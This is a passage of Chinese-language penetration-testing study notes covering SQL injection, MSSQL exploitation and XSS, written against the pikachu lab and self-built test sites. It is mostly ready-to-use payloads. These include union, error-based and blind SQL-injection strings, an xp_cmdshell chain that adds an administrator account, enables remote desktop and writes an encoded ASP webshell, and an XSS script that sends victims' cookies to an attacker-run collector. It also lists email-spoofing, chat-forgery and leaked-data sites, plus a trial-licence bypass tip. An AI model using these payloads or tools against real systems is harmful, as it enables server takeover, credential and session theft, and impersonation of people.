target="_blank" rel="noopener">https://www.hackerone.com/</a> xss poc <a href="http://xssor.io/" target="_blank" rel="noopener">http://xssor.io/</a><br>oday 漏洞库 <a href="https://www.0day.today/" target="_blank" rel="noopener">https://www.0day.today/</a><br>路由器漏洞库 <a href="http://routerpwn.com/" target="_blank" rel="noopener">http://routerpwn.com/</a> cve<br> 漏洞平台 <a href="http://cve.mitre.org/" target="_blank" rel="noopener">http://cve.mitre.org/</a></p><p><strong>威胁情报</strong></p><p>安全数据交流平台    <a href="https://www.secsilo.com/" target="_blank" rel="noopener">https://www.secsilo.com/</a><br>华为安全情报 <a href="https://isecurity.huawei.com/sec/web/intelligencePortal.do" target="_blank" rel="noopener">https://isecurity.huawei.com/sec/web/intelligencePortal.do</a><br>威胁情报共享平台    <a href="https://www.threatcrowd.org/" target="_blank" rel="noopener">https://www.threatcrowd.org/</a><br>被黑站点统计 <a href="http://www.hacked.com.cn/" target="_blank" rel="noopener">http://www.hacked.com.cn/</a></p><p><strong>社工库</strong></p><p>微信伪造    <a href="http://www.jietuyun.com/" target="_blank" rel="noopener">http://www.jietuyun.com/</a><br>任意邮箱发送    <a href="http://tool.chacuo.net/mailanonymous" target="_blank" rel="noopener">http://tool.chacuo.net/mailanonymous</a> 和 <a href="https://emkei.cz/" target="_blank" rel="noopener">https://emkei.cz/</a><br>临时邮箱 <a href="http://www.yopmail.com/" target="_blank" rel="noopener">http://www.yopmail.com/</a><br>邮箱池群 <a href="http://veryvp.com/" target="_blank" rel="noopener">http://veryvp.com/</a><br>社工库 <a href="http://www.uneihan.com/" target="_blank" rel="noopener">http://www.uneihan.com/</a>  </p><h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p><strong>ping命令</strong>：默认发送32个字节，四个数据包，通常情况下，如果TTL返回255，则通常为交换机或路由器设备，如果TTL返回128则可能为xp/2000/2003系统，如果TTL返回64，则通常为win7/2008/linux系统<br><strong>端口扫描</strong>:telnet ip+端口  （注意win7以上需要手动开启telnet服务）<br>X-scan匹配winxp，win2000，win2003系统<br><strong>AppScan扫描</strong>，建立扫描过程中要求建立一个scan文件，这是因为软件在扫描过程中可能会出现崩溃等情况，但是之前扫描过程中的记录都保存在该scan文件中，所以我们只需要导入该文件继续扫描即可。<br><strong>AXVS扫描</strong><br>安装完成后出现浏览器不能访问的情况，使用谷歌浏览器<br><strong>webInspect</strong><br>所耗内存较大，尽量将其安装在单独的虚拟机中，分配内存3G以上，系统win7以上，支持.net framework4.5.x和sqlserver2012，开启前需要确保services.msc 检查sql和webinspect全部正确开启以防出现扫描中断，10.3下载和安装需要vpn<br><strong>netsparker扫描器</strong><br> 使用较少<br><strong>WVSS</strong><br><strong>安恒</strong><br><strong>Nessus扫描器</strong><br><strong>Nexpose扫描器</strong>  ，这是个虚拟机，下载之后进行导入虚拟机.ova文件即可，需要的8g的内存<br><strong>启明天镜</strong><br>因为可以免费使用三个月，所以使用三个月以后重新安装虚拟机，或者将虚拟机中系统的时间更改一下即可<br><strong>RSAS</strong><br><strong>Burpsuite</strong> 需安装jdk1.8版本</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>以下所有的注入代码均为payload，payload实际上就是攻击代码<br>注意浏览器使用ie浏览器，版本过高导致安全性过高。<br><strong>原理</strong>：程序命令和用户数据之间没有做好分开，攻击者有机会将程序命令当作用户输入的数据提交给web程序，注入产生的原因是接受相关参数未经处理直接带入数据库。<br><strong>步骤1</strong>. 确定程序应用的编程语言和技术，通常考察web页面的页脚，查看错误页面，检查页面源代码，或使用Nessus，AWVS,APPSCAN等工具来进行刺探。<br><strong>步骤2.</strong>确定所有可能的输入方式 HTML表单，HTTP头部，Cookies，AJAX。我们可以求助于web代理，例如Burp<br><strong>步骤3.</strong>查找可以用于注射的用户输入。这个比较难，多留意web应用的错误页面。<br>万能输入，例如输入账号密码登录数据库<br>    <code>yuan  123</code> </p><blockquote><p>数据库中登录为 select * from admin where name = ‘yuan’ and password = ‘123’ </p></blockquote><p>我们使用 </p><blockquote><p>‘ or 1=1– </p></blockquote><p>密码随便输入数据库登录为 </p><blockquote><p>select * from admin where name = ‘’ or 1 = 1 and password = ‘随便’,</p></blockquote><p>其中’表示账号为空 –表示后面所有的数据都被注释，相当于执行 <code>select * from admin</code><br>注入前准备，取消IE浏览器的错误信息设置，因为浏览器默认不返回详细错误信息，只返回500错误。方法，在浏览器internet设置-&gt;高级中-&gt;将显示http友好错误信息的对号取消。<br>判断是否存在sql注入：1.在网址后面加上一个单引号，如果显示异常，说明可能存在漏洞。2.很多时候使用单引号会显示非法字符，这时候我们我们两次分别加上and1=1和and 1=2 ，如果显示不同的页面，则存在sql注入。<br><strong>数字型注入</strong> sql语句 </p><blockquote><p>select * from member where id = 1 or 1 = 1;  </p></blockquote><p><strong>字符型注入</strong> sql语句 </p><blockquote><p>select * from member where username = ‘vince’ or 1=1;</p></blockquote><p>在pikachu平台上输入 vince’ or 1=1#(注意，前面的单引号是与pikachu提供的sql语句前面单引号进行配对，后面的#是注释掉pikachu提供的后面的单引号)<br><strong>搜索型注入</strong> sql语句 </p><blockquote><p>select * from member where username like ‘%v%’ or 1=1;</p></blockquote><p>pikachu平台上输入 %v%’ or 1=1#<br><strong>xx型注入</strong>  sql语句   </p><blockquote><p>select * from member where username = (‘vince’) or 1=1;</p></blockquote><p>在pingkachu平台输入 xx’) or 1=1# 实际上与字符型只是在语法上有区别。</p><h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p><font color="red">注意使用搜索型注入</font><br>sql查询语法</p><blockquote><p>select id,email from member where username = ‘kevin’ union select username,pw from member where id=1;</p></blockquote><p>结果是将四个字段全部显示出来，但是字段名只显示主字段名，即id和email。在pikachu中使用v’ union select username,pw from member where id=1#，会出现报错，<strong>因为后面查询的字段要与主字段个数相同</strong>，所以我们需要看一下主查询总共有多少个字段，使用 a’ order by 4#,出现错误，使用a’ order by 3#,没有错误（如果还是错误就一直往下尝试，个数较多使用折半查找法），只是没有查询到。说明主查询总共有三个字段（pikachu默认查询三个字段）。最后我们做查询，</p><blockquote><p>设置payload：a’ union select database(),user(),version()#</p></blockquote><p>可查询数据库信息。或者</p><blockquote><p>v’ union select username,pw,sex from member where id=1#</p></blockquote><p>即可查询到。通过看username，id，email在每次查询时代表不同的意义</p><h3 id="information-schema注入"><a href="#information-schema注入" class="headerlink" title="information_schema注入"></a>information_schema注入</h3><p>属于搜索注入<br>information_schema是mysql自带的数据库，他包含了mysql中所有数据库的信息，所以注入他可以获得大量信息，我们需要获得数据库信息，使用 </p><blockquote><p>v’ union select database(),user(),3# </p></blockquote><p><strong>获取数据库表名</strong>，</p><blockquote><p>u’ union select table_schema,table_name,3 from information_schema.tables where table_schema=’pikachu’#</p></blockquote><p>获取数据库名称username，id，email代表数据库名称，用户权限，email无用。<br><strong>获取pikachu的字段名</strong> </p><blockquote><p>a’ union select table_name,column_name,3 from information_schema.columns where table_name=’users’# </p></blockquote><p>username，id，email分别代表表明，字段名，email无用。<br><strong>获取字段值</strong></p><blockquote><p> c’ union select username,password,3 from users#</p></blockquote><p><font color="red">最后获得密码后是个md5码，在网站<a href="http://www.cmd5.com中将其解析出来即可获取密码。" target="_blank" rel="noopener">www.cmd5.com中将其解析出来即可获取密码。</a></font></p><h3 id="基于函数报错注入"><a href="#基于函数报错注入" class="headerlink" title="基于函数报错注入"></a>基于函数报错注入</h3><p>在mysql中使用指定的函数来制造报错，从而获取信息<br>条件：后台没有屏蔽数据库报错信息，发生错误时输出在前端<br>报错注入分为updatexml注入和extractvalue（）注入<br>  updatexml注入分为1.载荷注入，2.insert注入 3.updata注入 4.delete注入<br><strong>三个常用报错函数</strong>：<br>使用指定函数来制造报错，从报错信息中获取指定信息。<br>1.updatexml函数（XML_document,XPath_string,new_value）：是mysql对xml文档数据进行查询和修改的XPATH函数<br>第一个参数，string格式，是文档对象的名字<br>第二个参数，Xpath格式的字符串<br>第三个参数，替换查找到的数据<br>例如</p><blockquote><p>k’ and updatexml(1,concat(0x7e,(select @@version),0x7e),1)#爆破数据库版本信息，0x7e是符号“~”的16进制  </p></blockquote><blockquote><p>k’ and updatexml(1,concat(0x7e,(select user()),0x7e),1)# 爆破数据库当前用户</p></blockquote><blockquote><p>k’ and updatexml(1,concat(0x7e,(select database()),0x7e),1)#爆破数据库名  </p></blockquote><blockquote><p>k’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’pikachu’ limit 0,1)),0)#爆破数据表，获取表名，，显示第二个数据limit1,1，其中limit限制返回的结果只显示一个，limit后一个数据是起始位置，第二个数字是去取出的数据条数</p></blockquote><blockquote><p>k’ and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’users’ limit 2,1)),0)# 爆字段名</p></blockquote><blockquote><p>k’ and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)#爆破密码</p></blockquote><p>2.extractvalue（）：也是mysql对xml文档数据进行查询的XPATH函数<br>3.floor（）：mysql中用来取整的函数。    </p><h3 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h3><p><font color="red">注意，insert注入用于用户注册端</font><br>原本是前端界面注册的信息，然后后台直接通过insert命令操作插入数据库。但是现在是后端没有做好防护，在前端输入可以直接拼接到到后端的insert语句，导致insert注入.<font color="red">在用户那里<strong>输入单引号</strong>，密码随便输入，页面会有报错信息，说明存在sql注入漏洞。</font><br>pikachu insert注入中在注册信息oldboy 密码123456后，登录中输入oldboy’ or updatexml(1,concat(0x7e,(命令)),0) or’#<br><strong>爆表名</strong>：oldboy’ or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’pikachu’ limit 0,1)),0) or’<br><strong>爆列名</strong> ‘ or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’users’ limit 2,1)),0) or’<br><strong>爆内容</strong> ‘ or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or’等同于’ or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or’1’=’1’ </p><h3 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h3><p> 与insert注入大体相同，区别在与update注入用于登录端，insert用于用户注册端。 这个需要在登录之后，在修改个人信息输入框中插入payload。<br>update注入payload： a’ or updatexml(0,concat(0x7e,(database())),0) or’  </p><h3 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h3><p>需要进行抓包后修改url，然后在抓取的路径后面写上payload<br>应用于前后端发帖，留言，用户等相关删除操作<br>注入payload ：delete from message where id =56 or updataxml(2,concat(0x7e,(database())),0)  </p><h3 id="http-header注入"><a href="#http-header注入" class="headerlink" title="http header注入"></a>http header注入</h3><p>原理：后端开发人员为了进行验证信息，或者通过http header获取一些信息（逻辑语句需要获得用户登录的信息进行后台处理），比如useragent，accept等字段，开发人员需要获得http header然后进行sql语句处理，此时会出现sql注入。<br>注入方法：在pikachu找到header模块，登录之后使用burp suit进行抓包，找到http header，找到user agent或者其他字段，然后删除里面的内容，输入<strong>单引号</strong>，如果出现错误，说明开发人员使用了该字段进行了sql语句处理，说明存在注入。设置payload： 1’ or updatexml(1,concat(0x7e,database()),0) or’ 进行注入。  </p><h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>原理：后端获取cookie后，开发人员使用cookie信息进行数据库处理，也会出现sql注入。<br>方法：使用burp suit抓包后，删除cookie后面的信息，输入<strong>单引号</strong>如果出现错误，说明后端使用了cookie信息，设置payload ：1’ or updatexml(1,concat(0x7e,database()),0) #  </p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>这种注入比较复杂。通常是其他注入输入后没有反应，或者重定向。<br><strong>1. boolean型盲注</strong>：在mysql命令行中输入select ascii(substr(database,1,1)) &gt; 数字，判断第一个数据库名中第一个字母ascii码的大小。（substr（string，start，length）函数），输入select length（database（））&lt; 数字，判断表名长度，一直尝试到正确值为止。然后在pikachu平台上输入 a’ and ascii(substr(database,1,1)) = 查找到的数字。就可以查找到第一个数据库字符。<br><strong>2. 时间型盲注</strong>  在基于boolean盲注实现不了的情况下，使用 a’ and if(substr(database(),1,1)=’p’)，sleep(10),null#可判断出数据库名第一个字符是否为p，。<br><strong>3. 宽字节注入</strong> phpini中的magic_quotes_gqc参数设为on时，所有单引号，双引号，null，反斜杠等就会被自动转义，所以此时无法注入，还有其他的函数也有类似的作用。这看上去安全，但是也容易出现漏洞。我们在单引号前面加上%df，则会变成%df&#39; = %df%5c%27=衰’，此时衰就干掉了\会变成就会有单引号了。开始注入  </p><h3 id="二阶sql注入"><a href="#二阶sql注入" class="headerlink" title="二阶sql注入"></a>二阶sql注入</h3><p>太复杂  </p><h3 id="ms-sql注入拿webshell实战"><a href="#ms-sql注入拿webshell实战" class="headerlink" title="ms sql注入拿webshell实战"></a>ms sql注入拿webshell实战</h3><p>参考文件,mssql即sql server  </p><h3 id="Access数据库注入"><a href="#Access数据库注入" class="headerlink" title="Access数据库注入"></a>Access数据库注入</h3><p>Access也是小众的数据库，远远没有ms sql数据库强大。<br>user是数据库的一个内置变量，它是字符型，根据出错信息判断数据库类型，即 在注入点后面写上 and user &gt; 0，根据出错信息判断数据库类型。如果提示Microsoft OLE DB Provider for SQL Server 错误‘80040e21’则可以判断为mssql数据库，如果提示’在将nvarchar值‘xxx’转换成数据类型int时失败’。则说明是access数据库。<br>如果IIS不许返回错误提示，则在注入点后使用查询语句<br>and (select count(<em>) from sysobjects) &gt;=0 和 and (select count(</em>) from msysobjects) &gt;=0,因为access存在msyobjects表，而sql server存在sysobjects，<br>所以如果是access，则返回 microsoft OLE DB Provider for ODBC Drivers 错误’80040e37’或者’数据库找不到输入表。<br>ms sqlServer会返回错误信息，Microsoft OLE DB Provider for SQL Server 错误’80040e37’/对象名’msysobjects’无效。<br><strong>猜数据库名：</strong> 注入点后面写 and exists(select * from 数据库表名)或者and (select count(<em>) from 数据库表名) &gt; 0 这样一直更换常见表名进行查询。<br><strong>猜字段名</strong> 注入点后面写 and exists(select 字段名 from 数据库表名)或者 and (select count(字段名) from 表名)，也是一直更换常见表名。<br><strong>猜字段长度</strong> and (select top 1 len(字段名) from 表名) &gt; 2<br><strong>猜字段ASCII码值</strong> 注入点后面写 and (select top1 asc(mid(字段名,1,1)) from 表名) &gt;0 … n 当 &gt; n-1时正常，到n时出错，说明ASCII码已找到，然后得到字段的第一个字符。再使用and(select top 1 asc(mid(字段名,2,1)) from 表名 ) &gt; 0…寻找第二个字符。。。<br><strong>Access注入案例</strong><br>注意这是手动猜解，比较复杂，但是实际上有破解工具等<br>1.首先自己搭建网站，<a href="http://ip：端口号/news_view.asp?id=14">http://ip：端口号/news_view.asp?id=14</a>(<font color="red">网站需要自己搭建</font>)注入点分别提交and 1=1和and 1=2返回不同的结果，说明存在注入。<br>2.猜表名和字段。<br>首先来猜解数据库表名，提交如下网址。<a href="http://ip/news_view.asp?id=14" target="_blank" rel="noopener">http://ip/news_view.asp?id=14</a> and exists(select * from users) 返回错误信息，说明 users 表不存在，继续提交。直至尝试到正确的数据库名字<br>继续猜测字段并提交。<br><a href="http://192.168.1.55:901/news_view.asp?id=14" target="_blank" rel="noopener">http://192.168.1.55:901/news_view.asp?id=14</a> and exists(select username from administrator)同样，直至猜解到正确的为止。<br>3.猜字段长度<br><a href="http://192.168.1.55:901/news_view.asp?id=14" target="_blank" rel="noopener">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 len(user_name) from administrator)&gt;1//正常<br><a href="http://192.168.1.55:901/news_view.asp?id=14" target="_blank" rel="noopener">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 len(user_name) from administrator)&gt;//报错，使用二分法进行猜解，直至查询到正确的长度。<br>4.猜字段内容<br><a href="http://192.168.1.55:901/news_view.asp?id=14" target="_blank" rel="noopener">http://192.168.1.55:901/news_view.asp?id=14</a>    and    (select    top    1<br>asc(mid(user_name,1,1)) from administrator)&gt;0    //返回正常页面（top1代表第一行，猜第一行的username字段第一个字符的ascii码）<br><a href="http://192.168.1.55:901/news_view.asp?id=14" target="_blank" rel="noopener">http://192.168.1.55:901/news_view.asp?id=14</a>    and    (select    top    1<br>asc(mid(user_name,1,1)) from administrator)&gt;500  //错误说明第一个字符在0-500之间<br>依次使用二分法，猜第二个字符（把username后面的第一个1变成2），第三个字符。<br>使用同样的方法猜username和password的值<br> 可以看出上面的方法太复杂，下面使用联合查询<br> <strong>联合查询（非常常用的方法）</strong><br>1.猜字段长度，<a href="http://ip:端口/news_view.asp?id=14">http://ip:端口/news_view.asp?id=14</a>     order by 7,尝试改变数字，直至正确。<br>2.猜字段名称，<a href="http://ip:端口/news_view.asp?id=14">http://ip:端口/news_view.asp?id=14</a> and 1=2 union select1, 2, 3，4，5，6,7 from administrator ，会返回某几个数字，比如2，3说明2和3字段的是<strong>可以修改</strong>的。<br>3.修改可以变化的数字为字段（前提是已经猜出字段名和表名），即<a href="http://ip:端口/news_view.asp?id=14">http://ip:端口/news_view.asp?id=14</a> and 1=2 union select1, user_name, password，4，5，6,7 from administrator   ,此时可以直接显示出用户名和密码。<br>破解完成。<br> <strong>偏移注入</strong><br>应用于Access数据库，用在猜到表名，猜不到列名。当使用联合查询查不到的情况下使用该方法<br>1.<a href="http://ip:端口/news_view.asp?id=14">http://ip:端口/news_view.asp?id=14</a> and 1=2 union select1, 2, 3，4，5，6,7 from administrator查询不到<br>2.<a href="http://ip:端口/news_view.asp?id=14">http://ip:端口/news_view.asp?id=14</a> UNION SELECT 1,2,3,4,</em> from administrator 分别用<em>号代替数字，直到返回正常页面。发现在 4 的时候页面返回正常，接着我们用 7-4=3（代表 administrator  有 3 个字段）再接着用 3*2+1=7 来构造第三步注入语句。2代表需要修改两个字段，3代表每个字段代表三个原字段，1代表1号位置不变<br>3.<a href="http://ip:端口/news_view.asp?id=14">http://ip:端口/news_view.asp?id=14</a> UNION SELECT 1, a.id,b.id, * from (administrator as a inner join administrator as b on a.id=b.id)     注:a.id ,b.id  每个占三个字段。<br>如果是10个字段<a href="http://ip:端口/news_view.asp?id=14">http://ip:端口/news_view.asp?id=14</a> UNION SELECT 1,a.id,b.id,c.id,</em> from ((administrator as a inner join administrator as b on a.id=b.id) inner join administrator as c a.id=c.id)即3*3+1</p><p><strong>注入跨库查询</strong><br>a,b站部署在同一个服务器上，测试后我们只找到a网站数据库路径，对数据库下载发现下载不了。这个时候我发现 b站点有注入点 。直接用<a href="http://ip：端口/news_view.asp?id=14">http://ip：端口/news_view.asp?id=14</a> UNION SELECT  1,adminpassword,username,4,5,6,7 from [数据库路径名].数据库名进行破解    </p><h3 id="cookie注入-1"><a href="#cookie注入-1" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>当get，post提交方式已经被加密狗，waf等拦截很多人会放弃，但是可以考虑cookie，原因，开发人员在代码中加入了防注入代码。三种方法，参考文件。强烈推荐sqlmap方法。</p><h3 id="MsSQL注入"><a href="#MsSQL注入" class="headerlink" title="MsSQL注入"></a>MsSQL注入</h3><p>mssql也称sql server<br>登录之后<br>1，判断是否存在注入点，注入点后面添加 and exists(select * from sysobjects)<br>2.检测当前用户的权限，and 1=(select IS_SRVROLEMEMBER(‘sysadmin’))，如果返回正常，则为sa最高权限<br>and 1=(select is_srvrolemember(‘db_owner’))这个权限可以找到web路径，可使用备份的方式拿到webshell<br>and 1=(select is_srvrolemember(‘public’))只对表和列操作有权限。<br>3.判断mssql版本 and @@version&gt;0 如果没显示有用的信息，那么说明关闭了错误提示，此时只能使用联合查询或者盲注。<br>此外，还可以进行如下查询检测，以获得更多的关于 MsSQL 注入点的信息。<br>;declare @d int    // 判断 MsSQL 支持多行语句查询<br>and (select count (1) from [sysobjects])&gt;=0    //是否支持子查询  and user&gt;O    //获取当前数据库用户名<br>and db_name&gt;0    //获取当前数据库名称<br>and l=convert (int,db_name ())    或 1=(select db_name ()) //  当前数据库名and 1=(select @@servername)        //本地服务名<br>and 1=(Select HAS_DBACCESS (‘master’))    //判断是否有库读取权  限<br><strong>MSSQL的扩展储存攻击</strong>：即mssql实现了某些函数的功能。<br>提交如下查询进行检测。<br>and 1=(Select count(<em>) FROM master. dbo.sysobjects    Where xtype =’X’ AND name = ‘xp_cmdshell’)可查看 xp_cmdshell 扩展存储过程是否被删除。<br>and 1=(Select count(</em>) FROM master. dbo.sysobjects    Where name = ‘xp_regread’)可查看 xp_regread 扩展存储过程是否被删除。如果扩展存储被删除，可执行如下查询进行恢复。;exec sp_dropextendedproc ‘xp_cmdshell’<br>上面这条查询语句，是在恢复前先删除 xp_cmdshell，以后再在后面重新进行创建，然后执行如下查询。<br>;exec sp_dropextendedproc ‘xp_cmdshell’ ,’xplog70.dll’该语句是利用系统中默认的“xplog70.dll”文件，自动恢复 xp_cmdshell<br>如果恢复不成功，说明该文件被改名或删除，可以上传个“xplog70.dll”文件，自定义路径进行恢复。例如，执行如下查询语句。;exec sp_dropextendedproc ‘xp_cmdshell’,’c:\xplog70.dll’<br><strong>在 SQL 注入攻击过程中，最常利用到的扩展存储有如下几个</strong><br>1.xp_cmdshell—利用此存储过程可以直接执行系统命令。<br>2.xp_regread—  利用此存储过程可以进行注册表读取。<br>3.xp_regwrit 一利用此存储过程可以写入注册表。<br>4.xp_dirtre 一利用此存储过程可以进行列目录操作。<br>5.xp_enumds—利用此存储过程可以进行 ODBC 连接。<br>6.xp_loginconfig-利用此存储过程可以配置服务器安全模式信息。<br>7.xp_makecab 一一利用此存储过程可以创建压缩卷。<br>8.xp_ntsec_enumdomains-利用此存储过程可以查看 domain 信息。<br>9.xp_terminate_jroces 一利用此存储过程可以查看终端进程，给出一个进程 PID.<br>具体操作参考文件。<br><strong>MS注入案例</strong><br>1.<a href="http://ip+端口/sqlserver/1.aspx?xxser=1" target="_blank" rel="noopener">http://ip+端口/sqlserver/1.aspx?xxser=1</a> andexists(select* from%20sysobjects)判断是否未mssql数据库<br>2.<a href="http://ip+端口/sqlserver/1.aspx?xxser=1" target="_blank" rel="noopener">http://ip+端口/sqlserver/1.aspx?xxser=1</a> and system_user=0，报错后根据返回信息获得当前系统用户名<br>3.<a href="http://ip+端口/sqlserver/1.aspx?xxser=1and" target="_blank" rel="noopener">http://ip+端口/sqlserver/1.aspx?xxser=1and</a> user=0获得当前用户名。<br>4.<a href="http://ip+端口/sqlserver/1.aspx?xxser=1" target="_blank" rel="noopener">http://ip+端口/sqlserver/1.aspx?xxser=1</a> and 1=(select IS_SRVROLEMEMBER(‘sysadmin’)) 判断是否是sa权限<br>5.<a href="http://ip+端口/sqlserver/1.aspx?xxser=1%20;declare%20@d%20int判断是否支持多行语句" target="_blank" rel="noopener">http://ip+端口/sqlserver/1.aspx?xxser=1%20;declare%20@d%20int判断是否支持多行语句</a><br>6.<a href="http://ip+端口/sqlserver/1.aspx?xxser=1" target="_blank" rel="noopener">http://ip+端口/sqlserver/1.aspx?xxser=1</a> and=(select count(<em>）frommaster.dbo.sysobjects where name=’xp_cmdshell’)判断是否存在cmdshell存储过程<br>7.<a href="http://ip+端口号/sqlserver/1.aspx?xxser=1;exec" target="_blank" rel="noopener">http://ip+端口号/sqlserver/1.aspx?xxser=1;exec</a><br>master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server’,’fDenyTSConnections’,’REG_DWORD’,0; 开启远程终端服务，注意0改为1就是关闭<br>8.<a href="http://ip+端口号/sqlserver/1.aspx?xxser=1;exec" target="_blank" rel="noopener">http://ip+端口号/sqlserver/1.aspx?xxser=1;exec</a> master..xp_cmdshell ‘net user test test /add’添加test账户<br>9.<a href="http://ip+端口号/sqlserver/1.aspx?xxser=1;exec" target="_blank" rel="noopener">http://ip+端口号/sqlserver/1.aspx?xxser=1;exec</a> master..xp_cmdshell ‘net localgroup administrators test /add’将账户加到管理员组<br>10.获取web路径<br>依次执行下面的连接<a href="http://ip+端口/sqlserver/1.aspx?xxser=1" target="_blank" rel="noopener">http://ip+端口/sqlserver/1.aspx?xxser=1</a>    ;drop table    black;create Table black(result varchar(7996) null, id int not null identity (1,1))–<br><a href="http://ip+端口/sqlserver/1.aspx?xxser=1" target="_blank" rel="noopener">http://ip+端口/sqlserver/1.aspx?xxser=1</a>    ;insert into black execmaster..xp_cmdshell ‘dir /s c:\1.aspx’–<br><a href="http://192.168.1.55/sqlserver/1.aspx?xxser=1" target="_blank" rel="noopener">http://192.168.1.55/sqlserver/1.aspx?xxser=1</a> and (select result from black where id=1)&gt;0–<br>11，%3c%25%65%76%61%6c%20%72%65%71%75%65%73%74%28%22%63%68%6f%70%70%65%72%22%29<br>%25%3e 写入一句话木马<br>12.提交<a href="http://192.168.1.55/sqlserver/1.aspx?xxser=1;exec" target="_blank" rel="noopener">http://192.168.1.55/sqlserver/1.aspx?xxser=1;exec</a>    sp_makewebtask ‘c:\wwwtest\1.asp’,’select’’%3c%25%65%76%61%6c%20%72%65%71%75%65%73%74%28%22%63%68%6f%70%70%65%72%22%29%25%3e’’’–<br>页面中返回 execute 执行错误信息，说明一句话木马写入成功。登录 Webshell 后门，利用 Webshell 开启远程终端进行连接服务器，这样就可以控制整台服务器了。<br>登录 Webshell 后门，利用 Webshell 开启远程终端进行连接服务器，这样就可以控制整台服务器了。<br>*</em>dbowner权限破解参考文件**<br><strong>public权限注入参考文件</strong></p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>下载地址和安装<code>https://www.freebuf.com/sectool/164608.html</code></p><h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><p>全称：跨站脚本攻击<br>攻击者在网页中嵌入客户端脚本，当用户点击时，就会在浏览器中执行。<br>XSS属于<strong>客户端攻击</strong>，受害者是用户，所以需要精通javascript语法。<br>漏洞类型：1.反射型：即数据在与用户交互的时候不会将数据放在数据库中，只是简单的将数据返回给用户，具有一次性。<br> 查看源码，源码在D:\phpStudy\PHPTutorial\WWW\pikachu\vul\xss\xss_dom_x.php中&gt; </p><p>定位前端源码，在google浏览器中按F12，然后单击某个元素，右键检查即可定位到该元素的前端源码，将输入框中的长度20改为200，这样输入payload<code>（&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt;）</code>时可以输入完整。提交后弹出输出框，当再次刷新的时候，就不会输出前面的内容，这就是反射型。<br>2.存储型XSS<br>交互的数据会被记录在数据库中，保持稳定。与反射型区别是，当再次进入该页面时，就会自动弹出输出框。</p><p>3、DOM XSS<br>不与后台服务器产生数据交互,通过前端的dom节点形成的XSS漏洞。<br>什么是DOM:DOM全称是Document Object Model，也就是文档对象模型。它会把网页文档转换为一个文档对象，主要功能是处理网页内容。这种漏洞实际上没有什么作用，也就是低位漏洞。地址栏没有提交参数。<br>查看源码。<div id="xssd_main"></div></p><blockquote><pre><code>            &lt;script&gt;                function domxss(){                    var str = window.location.search; //获取浏览器地址栏地址                    var txss = decodeURIComponent(str.split(&quot;text=&quot;)[1]);//将地址进行分割和解析                    var xss = txss.replace(/\+/g,&#39; &#39;);//将分割的内容赋值给xss变量                    //alert(xss);                    document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&#39;&quot;+xss+&quot;&#39;&gt;就让往事都随风,都随风吧&lt;/a&gt;&quot;;//将地址栏进行拼接然后给dom                }                //试试：&#39;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;                &quot;&gt;                //试试：&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;,闭合掉就行            &lt;/script&gt;            &lt;!--&lt;a href=&quot;&quot; onclick=(&#39;xss&#39;)&gt;--&gt;            &lt;form method=&quot;get&quot;&gt;            &lt;input id=&quot;text&quot; name=&quot;text&quot; type=&quot;text&quot;  value=&quot;&quot; /&gt;            &lt;input id=&quot;submit&quot; type=&quot;submit&quot; value=&quot;请说出你的伤心往事&quot;/&gt;            &lt;/form&gt;            &lt;div id=&quot;dom&quot;&gt;&lt;/div&gt;        &lt;/div&gt;</code></pre><p>分析源码如下，当输入payload (‘ onclick = “alert(1111)”),时点击提交和下面的who do you see,就会弹出对话框。 原理就是 payload将str这个变量给替换了<br>   <code>&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;what do you see?&lt;/a&gt;</code><br>    <code>&lt;a href=&#39;#&#39; onclick=&quot;alert(1111)&quot;&gt;what do you see?&lt;/a&gt;</code> </p></blockquote><p>4.DOM XSS-x型<br>这种是中位漏洞，与DOM XSS型的区别是，地址栏会有提交参数</p><p>XSS可能存在的地方<br>HTML context<br>Attribute Context<br>URL Context<br>Style Context<br>Script Context<br>工具：Appscan ,AWVS<br>手工：Brupsuite firefox（hackbar） XSSer XSSF（google插件）<br><strong>get方式：</strong><br>攻击者事先做好攻击连接，欺骗用户点击连接<br>原理：黑客先将xss代码（该代码会将用户的cookie信息写入到黑客搭建的xss平台中）写到带有xss漏洞的网站，生成url，并且伪装，用户点击了该链接，访问带有xss漏洞的网站，在这个过程中，用户的cookie信息就会被劫持。这是黑客在搜索栏写入的代码</p><pre><code>&gt; &lt;script&gt;document.location = &#39;http://192.168.0.45:82/pikachu/pkxss/xcookie/cookie.php?cookie=&#39; + document.cookie;&lt;/script&gt;，意思是将用户的cookie值传送到cookie.php文件中的cookie这个标签中。</code></pre><p> 下面是cookie.php文件代码</p><pre><code>&lt;?phpinclude_once &#39;../inc/config.inc.php&#39;;include_once &#39;../inc/mysql.inc.php&#39;;$link=connect();//这个是获取cookie的api页面if(isset($_GET[&#39;cookie&#39;])){$time=date(&#39;Y-m-d g:i:s&#39;);$ipaddress=getenv 